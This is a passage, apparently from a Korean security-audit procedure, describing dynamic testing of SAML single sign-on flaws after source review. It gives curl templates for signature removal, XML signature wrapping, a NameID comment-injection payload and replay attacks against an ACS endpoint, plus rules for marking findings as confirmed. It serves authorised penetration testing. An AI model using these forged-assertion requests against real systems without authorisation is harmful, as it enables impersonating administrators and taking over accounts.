### Phase 2: 동적 테스트 (검증)

Phase 1 소스코드 분석이 완료되면 후보 목록을 사용자에게 보여준다. 후보가 존재하는 경우에만 동적 테스트를 진행한다. 후보가 0건이면 동적 테스트 없이 바로 보고서를 작성한다.

**동적 테스트 정보 획득:**

사용자에게는 테스트 대상 도메인(Host)과 직접 획득이 불가능한 정보(외부 콜백 서비스 URL, 프로덕션 전용 자격 증명 등)만 요청한다. 그 외의 정보는 소스코드 분석 또는 관련 엔드포인트에 직접 HTTP 요청을 보내 획득한다.

사용자가 동적 테스트를 원하지 않거나 정보를 제공하지 않으면, 소스코드 분석 결과의 모든 후보를 "후보"로 유지한 채 Phase 3으로 진행한다.

**테스트 사전 준비:**
1. 정상 SSO 로그인을 수행하여 SAML Response를 캡처 (브라우저 개발자 도구 또는 Burp Suite)
2. SAMLResponse 파라미터를 Base64 디코딩하여 XML 확인
3. SAML Response 구조 분석 (서명 위치, Assertion ID, 속성값 확인)

**서명 제거 공격 테스트:**
```
# 1. SAML Response에서 <ds:Signature> 블록 제거
# 2. Assertion 속성값 변조 (name → admin, email → admin@target.com)
# 3. Base64 인코딩 후 ACS에 전송

curl -X POST "https://target.com/acs" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "SAMLResponse=[변조된_Base64]&RelayState=/dashboard"
```

**XML 서명 래핑 공격 테스트:**
```
# 1. 변조된 Assertion (ID="_evilID", 속성: admin)을 생성
# 2. 원본 서명된 Assertion 앞에 삽입
# 3. Base64 인코딩 후 ACS에 전송

curl -X POST "https://target.com/acs" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "SAMLResponse=[래핑된_Base64]&RelayState=/dashboard"
```

**Comment Injection 테스트:**
```xml
<!-- NameID에 주석 삽입 -->
<saml:NameID>admin<!-- injected -->@evil.com</saml:NameID>
```

**Replay 테스트:**
```
# 이전에 사용된 SAML Response를 동일하게 재전송
curl -X POST "https://target.com/acs" \
  -d "SAMLResponse=[이전_Response]&RelayState=/dashboard"
```

**검증 기준:**
- **확인됨**: 동적 테스트로 변조된 SAML Response가 수락되어 다른 사용자로 인증된 것을 직접 확인함
- **후보**: 동적 테스트를 수행하지 않았거나, 동적 테스트로 확인이 불가하여 수동 확인이 필요한 경우
- **"확인됨"은 동적 테스트를 통해서만 부여할 수 있다**: 소스코드 분석만으로는 아무리 취약해 보여도 "확인됨"으로 보고하지 않는다. 동적 테스트로 실제 트리거를 확인한 경우에만 "확인됨"이다. 동적 테스트를 수행하지 않았으면 모든 결과는 "후보"이다.
- **보고서 제외**: 동적 테스트 결과 취약하지 않은 것으로 확인된 경우는 보고서에 포함하지 않는다
